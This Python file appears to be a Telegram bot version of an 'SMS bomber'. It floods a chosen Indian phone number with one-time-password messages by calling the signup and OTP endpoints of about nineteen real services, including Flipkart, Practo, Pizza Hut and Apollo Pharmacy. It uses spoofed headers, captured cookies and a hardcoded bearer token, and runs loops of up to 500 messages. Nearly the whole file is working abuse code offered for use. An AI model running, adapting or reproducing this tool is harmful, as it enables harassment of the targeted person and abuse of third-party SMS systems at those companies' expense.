from telegram.ext import CommandHandler, Updater, run_async, MessageHandler, ConversationHandler, Filters
from datetime import datetime
import os
import hashlib
import sys
import time
import threading
import string
import random
import base64
import logging

try:
    import requests
    import urllib.request
    import urllib.parse
except ImportError:
    print('[!] Error: some dependencies are not installed')
    print('Type \'pip install -r requirements.txt\' to install all required packages')
    exit()

try:
    from config import Config
except ImportError:
    print("You removed the config file! Exiting now...")
    exit()

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',level=logging.INFO)

count_inf = 0

country_codes = {
    '91': 'IN'
}

NUMBER, MSGS, DELAY = range(3)

@run_async
def getapi(pn, lim, cc):
    global country_codes
    cc = str(cc).strip()
    cnn = country_codes[cc]
    lim = int(lim)
    url = ["https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" +
           str(cc) + "&nod=4&phone=" + pn, "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + pn, "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + pn]
    try:
        if lim < len(url):
            urllib.request.urlopen(str(url[lim]))
            return True
    except (urllib.error.HTTPError, urllib.error.URLError):
        return False
    if lim == 3:
        headers = {
        'Host': 'm.netmeds.com',
        'content-length': '76',
        'accept': '*/*',
        'origin': 'https://m.netmeds.com',
        'x-requested-with': 'XMLHttpRequest',
        'save-data': 'on',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'referer': 'https://m.netmeds.com/customer/account/login/',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
        'cookie': '_ga=GA1.3.185497001.1558720330'}
        data = {
          'register_mobileno': pn,
          'logintype': 'Otp',
          'uniq_identy': 'quWqfunF',
          'forget_pwd': 'N'
        }
        response = requests.post('https://m.netmeds.com/sociallogin/popup/nmsgetcode/', headers=headers, data=data)
        return True
    elif lim == 4:
        headers = {
        'Host': 'client-api.goomo.com',
        'origin': 'https://www.goomo.com',
        'client': 'm-web',
        'x-goomo-platform': 'mWeb',
        'dnt': '1',
        'content-type': 'application/json',
        'accept': '*/*',
        'referer': 'https://www.goomo.com/hotels',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9'}
        data = {"email":"fakeemail@gmail.com","phone_number":pn,"country_code":cc}
        response = requests.post('https://client-api.goomo.com/v2/phone_confirmation/verify_user', headers=headers, json=data)
        return True
    elif lim == 5:
        headers = {
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Content-Length': '34',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'www.oriyamatrimony.com',
            'Referer': 'https://www.oriyamatrimony.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 8.1; Win64; x64; rv:59.0) Gecko/20 Firefox/56.0',
            'X-Requested-With': 'XMLHttpRequest'}
        data = {'countrycode': cc, 'mobileno': pn}
        response = requests.post('https://www.oriyamatrimony.com/login/mobileappsms-homepage.php', headers=headers, data=data)
        return True
    elif lim == 6:
        headers = {
        'host': 'www.flipkart.com',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.5',
        'accept-encoding': 'gzip, deflate, br',
        'referer': 'https://www.flipkart.com/',
        'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0 FKUA/website/41/website/Desktop',
        'origin': 'https://www.flipkart.com',
        'connection': 'keep-alive',
        'Content-Type': 'application/json; charset=utf-8'}
        data = {"loginId":["+"+cc+pn],"supportAllStates":"true"}
        response = requests.post('https://www.flipkart.com/api/6/user/signup/status', headers=headers, json=data)
        return True
    elif lim == 7:
        cookies = {
        'Cookie:T': 'BR%3Acjvqzhglu1mzt95aydzhvwzq1.1558031092050',
        'SWAB': 'build-44be9e47461a74d737914207bcbafc30',
        'lux_uid': '155867904381892986',
        'AMCVS_17EB401053DAF4840A490D4C%40AdobeOrg': '1',
        'AMCV_17EB401053DAF4840A490D4C%40AdobeOrg': '-227196251%7CMCIDTS%7C18041%7CMCMID%7C63273353035509304576927719203948933246%7CMCAID%7CNONE%7CMCOPTOUT-1558686245s%7CNONE%7CMCAAMLH-1559283845%7C12%7CMCAAMB-1559283845%7Cj8Odv6LonN4r3an7LhD3WZrU1bUpAkFkkiY1ncBR96t2PTI',
        's_cc': 'true',
        'SN': '2.VI8085A6A237EB4C62836C8809F0D312EB.SI21A9EC4E99B949B2ACE6361B3F0208CC.VS187649B2B06A44C69824006710CB6D83.1558679078',
        'gpv_pn': 'HomePage',
        'gpv_pn_t': 'Homepage',
        'S': 'd1t17GQVqPz9KPzobP3M4GQkjPy34TjfJxI4SbXVIvhwzm3mE13vfSEulmf90D/7L710qUpMq8mA0k2bx6b2DuwIS4g==',
        's_sq': '%5B%5BB%5D%5D'}
        headers = {
            'Host': 'www.flipkart.com',
            'Connection': 'keep-alive',
            'Content-Length': '60',
            'X-user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36 FKUA/website/41/website/Desktop',
            'Origin': 'https://www.flipkart.com',
            'Save-Data': 'on',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*',
            'Referer': 'https://www.flipkart.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
        }
        data = {
          'loginId': '+'+cc+pn,
          'state': 'VERIFIED',
          'churnEmailRequest': 'false'
        }
        response = requests.post('https://www.flipkart.com/api/5/user/otp/generate', headers=headers, cookies=cookies, data=data)
        return True
    elif lim == 8:
        headers = {
            'Host': 'www.ref-r.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Length': '26',
            'DNT': '1',
            'Connection': 'keep-alive',
        }
        data = {
          'mobile': pn,
          'submit': '1',
          'undefined': ''
        }
        response = requests.post('https://www.ref-r.com/clients/lenskart/smsApi', headers=headers, data=data)
        return True
    elif lim == 9:
        headers = {
            'X-DROID-VERSION': '4.12.5',
            'API-Version': '2.0',
            'user-agent': 'samsung SM-G9350 0 4.4.2',
            'client-version': 'Android-4.12.5',
            'X-DROID-VERSION-CODE': '158',
            'Accept': 'application/json',
            'client-name': 'Practo Android App',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'accounts.practo.com',
            'Connection': 'Keep-Alive',
            'Content-Length': '96'}
        data = {
          'client_name': 'Practo Android App',
          'mobile': '+'+cc+pn,
          'fingerprint': '',
          'device_name':'samsung+SM-G9350'}
        response = requests.post( "https://accounts.practo.com/send_otp", headers=headers, data=data)
        rd=response.text
        return rd.find("success") != -1
    elif lim == 10:
        headers = {
            'Host': 'm.pizzahut.co.in',
            'content-length': '114',
            'origin': 'https://m.pizzahut.co.in',
            'authorization': 'Bearer ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SmtZWFJoSWpwN0luUnZhMlZ1SWpvaWIzQXhiR0pyZEcxbGRYSTBNWEJyTlRGNWNqQjBkbUZsSWl3aVlYVjBhQ0k2SW1WNVNqQmxXRUZwVDJsS1MxWXhVV2xNUTBwb1lrZGphVTlwU2tsVmVra3hUbWxLT1M1bGVVcDFXVmN4YkdGWFVXbFBhVWt3VGtSbmFVeERTbmRqYld4MFdWaEtOVm96U25aa1dFSjZZVmRSYVU5cFNUVlBSMUY0VDBkUk5FMXBNV2xaVkZVMVRGUlJOVTVVWTNSUFYwMDFUV2t3ZWxwcVp6Vk5ha0V6V1ZSTk1GcHFXV2xNUTBwd1l6Tk5hVTlwU205a1NGSjNUMms0ZG1RelpETk1iVEZvWTI1U2NWbFhUbkpNYlU1MllsTTVhMXBZV214aVJ6bDNXbGhLYUdOSGEybE1RMHBvWkZkUmFVOXBTbTlrU0ZKM1QyazRkbVF6WkROTWJURm9ZMjVTY1ZsWFRuSk1iVTUyWWxNNWExcFlXbXhpUnpsM1dsaEthR05IYTJsTVEwcHNaVWhCYVU5cVJURk9WR3MxVG5wak1VMUVVWE5KYlRWcFdtbEpOazFVVlRGUFZHc3pUWHByZDA1SU1DNVRaM1p4UmxOZldtTTNaSE5pTVdSNGJWVkdkSEExYW5WMk9FNTVWekIyZDE5TVRuTkJNbWhGVkV0eklpd2lkWEJrWVhSbFpDSTZNVFUxT1RrM016a3dORFUxTnl3aWRYTmxja2xrSWpvaU1EQXdNREF3TURBdE1EQXdNQzB3TURBd0xUQXdNREF0TURBd01EQXdNREF3TURBd0lpd2laMlZ1WlhKaGRHVmtJam94TlRVNU9UY3pPVEEwTlRVM2ZTd2lhV0YwSWpveE5UVTVPVGN6T1RBMExDSmxlSEFpT2pFMU5qQTRNemM1TURSOS5CMGR1NFlEQVptTGNUM0ZHM0RpSnQxN3RzRGlJaVZkUFl4ZHIyVzltenk4',
            'x-source-origin': 'PWAFW',
            'content-type': 'application/json',
            'accept': 'application/json, text/plain, */*',
            'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
            'save-data': 'on',
            'languagecode': 'en',
            'referer': 'https://m.pizzahut.co.in/login',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
            'cookie': 'AKA_A2=A'}
        data = {"customer":{"MobileNo":pn,"UserName":pn,"merchantId":"98d18d82-ba59-4957-9c92-3f89207a34f6"}}
        response = requests.post('https://m.pizzahut.co.in/api/cart/send-otp?langCode=en', headers=headers, data=data)
        return True
    elif lim == 11:
        headers = {
            'host': 'www.goibibo.com',
            'user-agent': 'Mozilla/5.0 (Windows NT 8.0; Win32; x32; rv:58.0) Gecko/20100101 Firefox/57.0',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.5',
            'accept-encoding': 'gzip, deflate, br',
            'referer': 'https://www.goibibo.com/mobile/?sms=success',
            'content-type': 'application/x-www-form-urlencoded',
            'content-length': '14',
            'connection': 'keep-alive',
            'upgrade-insecure-requests': '1'}
        data = {'mbl': pn}
        response = requests.post('https://www.goibibo.com/common/downloadsms/', headers=headers, data=data)
        return True
    elif lim == 12:
        headers = {
        'Host': 'www.apollopharmacy.in',
        'content-length': '17',
        'accept': '*/*',
        'origin': 'https://www.apollopharmacy.in',
        'x-requested-with': 'XMLHttpRequest',
        'save-data': 'on',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'referer': 'https://www.apollopharmacy.in/sociallogin/mobile/login/',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
        'cookie': 'section_data_ids=%7B%22cart%22%3A1560239751%7D'}
        data = {'mobile': pn}
        response = requests.post('https://www.apollopharmacy.in/sociallogin/mobile/sendotp/', headers=headers, data=data)
        rd=response.text
        return rd.find("sent") != -1
    elif lim == 13:
        headers = {
            'Host': 'scripts.ktmtech.in',
            'Connection': 'keep-alive',
            'Origin': 'https://www.ninzatech.com',
            'Sec-Fetch-Dest': 'empty',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
            'Accept': '*/*',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'cors',
            'Referer': 'https://scripts.ktmtech.in/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        response = requests.get('https://scripts.ktmtech.in/SmS/?phn=' + pn + '&code=309cf572c0618fa79eb4d48db9b63764 ', headers=headers).json()
        try:
            identifier = str(response['status'])
            if identifier == "true":
                return True
            else:
                return False
        except IndexError:
            return False
    elif lim == 14:
        headers = {
            'Host': 'api.cloud.altbalaji.com',
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/plain, */*',
            'Origin': 'https://lite.altbalaji.com',
            'Save-Data': 'on',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36',
            'Content-Type': 'application/json;charset=UTF-8',
            'Referer': 'https://lite.altbalaji.com/subscribe?progress=input',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
        }
        data = {"country_code":cc,"phone_number":pn}
        response = requests.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', headers=headers, json=data)
        rd=response.text
        return rd == '24f467b24087ff48c96321786d89c69f'
    elif lim == 15:
        cookies = {
            'Cookie:frontend': 'a27mn3h3irt1rlt6i55s93p9r5',
            'frontend_cid': '8zqBBzwQTMIt9UKg',
            '_BEAMER_USER_ID_gADrycBn12870': 'c9fe4f7d-b421-4bad-9cf2-0a4db716dff4',
            'G_ENABLED_IDPS': 'google',
        }
        headers = {
            'Host': 'www.aala.com',
            'Connection': 'keep-alive',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Origin': 'https://www.aala.com',
            'X-Requested-With': 'XMLHttpRequest',
            'Save-Data': 'on',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': 'https://www.aala.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5',
        }
        data = {
          'email': cc+pn,
          'firstname': 'SpeedX',
          'lastname': 'SpeedX'
        }
        response = requests.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, cookies=cookies, json=data)
        rd=response.text
        return rd.find('code:') != -1
    elif lim == 16:
        data = {
          'method': 'SMS',
          'countryCode': 'id',
          'phoneNumber': cc+pn,
          'templateID': 'pax_android_production'
        }
        response = requests.post('https://api.grab.com/grabid/v1/phone/otp', data=data)
        return True
    elif lim == 17:
        headers = {
            'Host': 'shahxhtml.somee.com',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'DNT': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Referer': 'http://shahxhtml.somee.com/bomber/pokkt.php',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        response = requests.get("http://shahxhtml.somee.com/bomber/pokkt.php?no=" + pn + "&l=1", headers=headers)
        rd = response.text
        if rd.find("Bombed") != -1:
            return True
        else:
            return False
    elif lim == 18:
        headers = {
            'Host': 't.justdial.com',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
            'Sec-Fetch-Dest': 'document',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        response = requests.get("https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile=" + pn, headers=headers)
        rd = response.text
        if rd.find("Verification code sent successfully") != -1:
            return True
        else:
            return False
    return False

@run_async
def bomb(target, counter, delay, ch, cc, update, context, msg_id):
    chat_id = update.effective_chat.id
    failed = 0
    requested = 0
    success = int(requested) - int(failed)
    bombs = int(counter) + 1
    while success < (int(bombs)):
        try:
            api = random.choice(ch)
        except Exception:
            if cc == "91":
                print('Sorry All APIs Have Expired Please Update TBomb')
                exit()
            else:
                pass
        print("==================================================================")
        print("==================================================================")
        print("            Target Number           : +" + str(cc) + " ", target)
        print("            Number of Requests Sent : ", requested)
        print("            Successful Requests     : ", success)
        print("            Failed Requests         : ", failed)
        print("==================================================================")
        print("==================================================================")
        try:
            result = getapi(target, api, cc)
        except Exception:
            result = False
        requested = requested + 1
        if result:
            success = success + 1
        else:
            failed = failed + 1
            while ch.count(api) > 0:
                ch.remove(api)
        time.sleep(float(delay))
    context.bot.sendMessage(chat_id=chat_id, text="Bombing Completed!", reply_to_message_id=msg_id)

@run_async
def do_bomb(num, ctr, delay, update, context, msg_id):
    chat_id = update.effective_chat.id
    pn = num
    nm = int(ctr)
    dl = float(delay)
    maxlim = 500
    if nm > maxlim:
        print('Number Of SMS Has been Set To ' + str(maxlim))
        nm = maxlim
    ch = [i for i in range(19)]
    bomb(pn, nm, dl, ch, '91', update, context, msg_id)

@run_async
def start(update, context):
    chat_id = update.effective_chat.id
    msg_id = update.effective_message.message_id
    if chat_id not in Config.AUTH_USERS:
        context.bot.sendMessage(chat_id=chat_id, text="You are not authorized to use this bot!", reply_to_message_id=msg_id)
        return
    context.bot.sendMessage(chat_id=chat_id, text="Please use me responsibly! Press /bomb to use me", reply_to_message_id=msg_id)

@run_async
def start_bomb(update, context):
    chat_id  = update.effective_chat.id
    msg_id = update.effective_message.message_id
    if chat_id not in Config.AUTH_USERS:
        context.bot.sendMessage(chat_id=chat_id, text="You are not authorized to use this bot!", reply_to_message_id=msg_id)
        return
    context.bot.sendMessage(chat_id=chat_id, text="Alright! Send me the number you want to bomb!", reply_to_message_id=msg_id)
    return NUMBER

@run_async
def number(update, context):
    chat_id = update.effective_chat.id
    context.user_data["num"] = update.message.text
    msg_id = update.effective_message.message_id
    if update.message.text in Config.NO_BOMB_NUMS:
        context.bot.sendMessage(chat_id=chat_id, text="Won\'t bomb this number, it\'s protected! Press /bomb to start again!", reply_to_message_id=msg_id)
        return
    context.bot.sendMessage(chat_id=chat_id, text="Will bomb " + update.message.text + "! Now provide the number of messages to send", reply_to_message_id=msg_id)
    return MSGS

@run_async
def msgs(update, context):
    chat_id = update.effective_chat.id
    context.user_data["msgs"] = update.message.text
    msg_id = update.effective_message.message_id
    context.bot.sendMessage(chat_id=chat_id, text=update.message.text + " number of messages will be sent! Now provide delay", reply_to_message_id=msg_id)
    return DELAY

@run_async
def delay(update, context):
    chat_id = update.effective_chat.id
    context.user_data["delay"] = update.message.text
    msg_id = update.effective_message.message_id
    try:
        num = context.user_data["num"]
        ctr = context.user_data["msgs"]
        delay = context.user_data["delay"]
        do_bomb(num,ctr,delay,update,context,msg_id)
        text = "Bombing " + num + " with " + ctr + " messages, each with a delay of " + delay + " seconds..."
        context.bot.sendMessage(chat_id=chat_id, text=text)
        context.bot.sendMessage(chat_id=chat_id, text="Bombing now...", reply_to_message_id=msg_id)
    except IndexError:
        context.bot.sendMessage(chat_id=chat_id,text="You missed one or more parameters, exiting...")
        return
    return ConversationHandler.END

@run_async
def error(update, context):
    """Log Errors caused by Updates."""
    logger.warning('Update "%s" caused error "%s"', update, context.error)

@run_async
def cancel(update, context):
    chat_id = update.effective_chat.id
    msg_id = update.effective_message.message_id
    context.bot.sendMessage(chat_id=chat_id, text="Operation cancelled by user", reply_to_message_id=msg_id)
    return ConversationHandler.END

def main():
    updater = Updater(token=Config.BOT_TOKEN, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler('start',start))
    conv_handler = ConversationHandler(
        entry_points = [CommandHandler('bomb', start_bomb)],
        states = {
            NUMBER: [MessageHandler(Filters.text, number)],
            MSGS: [MessageHandler(Filters.text, msgs)],
            DELAY: [MessageHandler(Filters.text, delay)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    dp.add_handler(conv_handler)
    dp.add_error_handler(error)
    updater.start_polling()
    logging.info('Bot started!')
    updater.idle()

if __name__ == '__main__':
    main()